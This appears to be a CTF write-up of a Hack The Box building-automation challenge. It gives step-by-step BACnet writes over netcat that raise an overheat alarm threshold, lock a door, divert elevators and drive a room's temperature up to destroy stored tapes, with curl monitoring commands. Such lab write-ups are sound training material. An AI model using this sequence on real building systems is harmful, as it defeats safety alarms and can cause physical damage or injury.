# Steel Mountain — Hack The Box CTF Writeup

## Challenge Information

|Field|Details|
|-|-|
|Platform|Hack The Box|
|Challenge|Steel Mountain|
|Category|ICS / OT / Building Automation|
|Protocol|BACnet|
|Status|Solved|
|Flag|`\\\[REDACTED]`|

> \\\*\\\*Note:\\\*\\\* The flag is intentionally redacted for a public GitHub repository. The purpose of this writeup is to document methodology, analysis, and lessons learned.

\---

## Overview

Steel Mountain is an ICS/OT-style Hack The Box challenge focused on building automation security. The challenge provides access to a web dashboard and a BACnet interaction service. The goal is to manipulate building automation objects to damage tapes stored in the Tape Storage Room while avoiding alarms and preventing physical access to the room.

The challenge involves several building systems:

* Temperature sensors
* Thermostat setpoints
* Overheat alarm thresholds
* Air conditioning status
* Door lock states
* Elevator target floors
* A BACnet control interface

The main lesson from this challenge is that successful exploitation requires understanding the physical process state, not just changing one writable value.

\---

## Objective

The mission requires the following:

1. Identify the level where the Tape Storage Room is located.
2. Lock the Tape Storage Room door.
3. Prevent elevators from stopping at Level 2.
4. Raise the Level 2 temperature to burn the tapes.
5. Keep the required temperature condition stable long enough for the mission to complete.

The challenge instructions state that the tapes burn at **32°C** and must remain at that temperature for **two minutes**.

\---

## Initial Access

The challenge provided two target services:

```text
00 - Web dashboard
01 - BACnet interaction service
```

I used environment variables to make the commands easier to reuse:

```bash
WEB="http://TARGET\\\_HOST:WEB\\\_PORT"
BACNET\\\_HOST="TARGET\\\_HOST"
BACNET\\\_PORT="BACNET\\\_PORT"
```

The web dashboard exposed a `/data` endpoint that returned JSON containing the current state of the building automation system:

```bash
curl -s "$WEB/data" | jq
```

The BACnet service was accessible with Netcat:

```bash
nc "$BACNET\\\_HOST" "$BACNET\\\_PORT"
```

The BACnet tool presented three options:

```text
1. objects
2. bacnet.read
3. bacnet.write
```

The most useful option was `bacnet.write`, which allowed writing to BACnet object properties.

\---

## Blueprint Analysis

The provided blueprint showed that the **Tape Storage Room** is located on **Level 2**.

This meant the relevant target systems were the Level 2 door, Level 2 temperature controls, Level 2 alarm controls, and elevator movement to/from Level 2.

\---

## BACnet Object Enumeration

Using the BACnet object listing and `/data` endpoint, I identified the following relevant objects.

|Object Name|Object Type|Object ID|Purpose|
|-|-:|-:|-|
|`Temp-L2-20`|`analogInput`|`20`|Actual Level 2 temperature sensor|
|`Therm-L2-21`|`analogOutput`|`21`|Level 2 thermostat setpoint|
|`ACS-L2-22`|`binaryOutput`|`22`|Level 2 air conditioning status|
|`OHAP-L2-23`|`analogOutput`|`23`|Level 2 overheat alarm point|
|`OHA-L2-24`|`binaryInput`|`24`|Level 2 overheat alarm state|
|`L2-TSR-DR`|`multiStateOutput`|`102`|Tape Storage Room door|
|`ELE-1-CF`|`analogOutput`|`80`|Elevator 1 current floor|
|`ELE-1-TF`|`analogOutput`|`82`|Elevator 1 target floor|
|`ELE-2-CF`|`analogOutput`|`83`|Elevator 2 current floor|
|`ELE-2-TF`|`analogOutput`|`85`|Elevator 2 target floor|
|`Message`|`binaryOutput`|`500`|Mission status / result message|

\---

## Important System Logic

### Tape Storage Room Door

The Tape Storage Room door object was:

```text
L2-TSR-DR
Object Type: multiStateOutput
Object ID: 102
```

The door values were:

```text
0 = OPEN
1 = CLOSED-UNLOCKED
2 = CLOSED-LOCKED
```

To satisfy the mission requirement, this needed to be set to `2`.

\---

### Temperature Control

Two Level 2 temperature values were important:

```text
Therm-L2-21 = thermostat setpoint
Temp-L2-20  = actual measured temperature
```

This distinction was critical. Setting the thermostat to 32°C did not immediately mean the real Level 2 temperature was 32°C.

The actual temperature sensor had to reach and remain at or above the required threshold.

\---

### Overheat Alarm

The Level 2 overheat alarm point was:

```text
OHAP-L2-23
Object Type: analogOutput
Object ID: 23
```

The default Level 2 alarm threshold was 25°C.

Since the mission required the level to reach 32°C, the overheat alarm threshold had to be raised before increasing the temperature. Otherwise, the alarm could trigger and reset the challenge.

\---

### Elevators

The instructions required denying elevators from stopping at Level 2.

The relevant target floor objects were:

```text
ELE-1-TF = Elevator 1 target floor
ELE-2-TF = Elevator 2 target floor
```

To avoid Level 2, I moved Elevator 1 and Elevator 2 to floors other than Level 2.

\---

## Failed Attempt

The first approach was to set the Level 2 thermostat directly to 32°C:

```text
3
analogOutput 21 presentValue 32
```

This changed the thermostat setpoint, but the challenge did not complete.

The issue was that the actual Level 2 temperature sensor fluctuated. It sometimes dipped slightly below 32°C, which likely reset the internal two-minute timer.

This showed that the challenge was not only checking the thermostat setpoint. It was checking the actual process value from the Level 2 temperature sensor.

\---

## Correct Exploitation Plan

The working approach was:

1. Raise the Level 2 overheat alarm threshold.
2. Keep the Level 2 air conditioning system in a valid state.
3. Lock the Tape Storage Room door.
4. Move elevators away from Level 2.
5. Set the Level 2 thermostat slightly above 32°C.
6. Monitor the actual Level 2 temperature until the success message appeared.

\---

## Exploitation Steps

### Step 1 — Connect to the BACnet Service

```bash
nc "$BACNET\\\_HOST" "$BACNET\\\_PORT"
```

\---

### Step 2 — Raise the Level 2 Overheat Alarm Threshold

The default Level 2 overheat alarm point was too low. I raised it to 40°C:

```text
3
analogOutput 23 presentValue 40
```

Expected result:

```text
True
```

This prevented the Level 2 overheat alarm from triggering when the temperature rose above 32°C.

\---

### Step 3 — Ensure Level 2 Air Conditioning Status Was Enabled

```text
3
binaryOutput 22 presentValue 1
```

Expected result:

```text
True
```

\---

### Step 4 — Lock the Tape Storage Room Door

```text
3
multiStateOutput 102 presentValue 2
```

Expected result:

```text
True
```

This set the Tape Storage Room door to:

```text
CLOSED-LOCKED
```

\---

### Step 5 — Move Elevators Away From Level 2

Move Elevator 1 away from Level 2:

```text
3
analogOutput 82 presentValue 1
```

Expected result:

```text
True
```

Move Elevator 2 away from Level 2:

```text
3
analogOutput 85 presentValue 3
```

Expected result:

```text
True
```

The goal was to make sure neither elevator was targeting Level 2 during the burn window.

\---

### Step 6 — Increase the Level 2 Thermostat

Setting the thermostat to exactly 32°C caused the real temperature to fluctuate around the threshold, so I set the thermostat slightly higher:

```text
3
analogOutput 21 presentValue 33
```

Expected result:

```text
True
```

This allowed the actual Level 2 temperature sensor to stay above 32°C long enough for the mission condition to complete.

\---

## Monitoring

I monitored the Level 2 temperature, thermostat setpoint, alarm state, and mission message with:

```bash
watch -n 5 'curl -s http://TARGET\\\_HOST:WEB\\\_PORT/data | jq "{temp: .\\\[\\\\"Temp-L2-20\\\\"].presentValue, setpoint: .\\\[\\\\"Therm-L2-21\\\\"].presentValue, alarm: .\\\[\\\\"OHA-L2-24\\\\"].presentValue, msg: .Message.Description}"'
```

Desired state:

```text
temp >= 32.0
setpoint = 33.0
alarm = 0
msg = ""
```

The important value was `temp`, which came from the actual temperature sensor:

```text
Temp-L2-20
```

not just the thermostat setpoint:

```text
Therm-L2-21
```

\---

## Checking the Result

After the temperature remained high enough, I checked the message object:

```bash
curl -s "$WEB/data" | jq '.Message'
```

The challenge returned the flag in the `Message.Description` field.

For the public writeup, the flag is redacted:

```text
Flag: \\\[REDACTED]
```

\---

## Final Command Summary

```bash
WEB="http://TARGET\\\_HOST:WEB\\\_PORT"
BACNET\\\_HOST="TARGET\\\_HOST"
BACNET\\\_PORT="BACNET\\\_PORT"
```

```bash
nc "$BACNET\\\_HOST" "$BACNET\\\_PORT"
```

Then issue the following BACnet writes interactively:

```text
3
analogOutput 23 presentValue 40

3
binaryOutput 22 presentValue 1

3
multiStateOutput 102 presentValue 2

3
analogOutput 82 presentValue 1

3
analogOutput 85 presentValue 3

3
analogOutput 21 presentValue 33
```

Monitor the result:

```bash
watch -n 5 'curl -s http://TARGET\\\_HOST:WEB\\\_PORT/data | jq "{temp: .\\\[\\\\"Temp-L2-20\\\\"].presentValue, setpoint: .\\\[\\\\"Therm-L2-21\\\\"].presentValue, alarm: .\\\[\\\\"OHA-L2-24\\\\"].presentValue, msg: .Message.Description}"'
```

Check the mission message:

```bash
curl -s "$WEB/data" | jq '.Message'
```

\---

## Key Takeaways

* BACnet object enumeration is essential in building automation challenges.
* Writable BACnet objects can directly affect physical building systems.
* The setpoint and actual sensor value are not the same thing.
* Physical process values can fluctuate, so exact threshold values may be unreliable.
* Alarm thresholds must be understood before changing process values.
* ICS/OT challenges often require monitoring system state over time, not just issuing one command.
* The safest exploitation path was to avoid triggering alarms while satisfying the mission conditions.

\---

## Skills Demonstrated

* BACnet object enumeration
* BACnet property writes
* Building automation system analysis
* Web dashboard inspection
* JSON parsing with `jq`
* Netcat interaction
* Process monitoring
* ICS/OT troubleshooting
* Understanding physical process behavior
* Alarm threshold analysis

\---

## Reflection

This challenge was a strong example of why ICS and OT security requires thinking beyond normal IT exploitation.

The successful path was not simply “find writable object and change value.” The system required multiple coordinated changes across access control, elevators, temperature control, and alarm logic.

The most important lesson was that the physical process state mattered. The thermostat setpoint did not complete the challenge by itself. The actual Level 2 temperature needed to stay above the required threshold long enough for the system to register success.

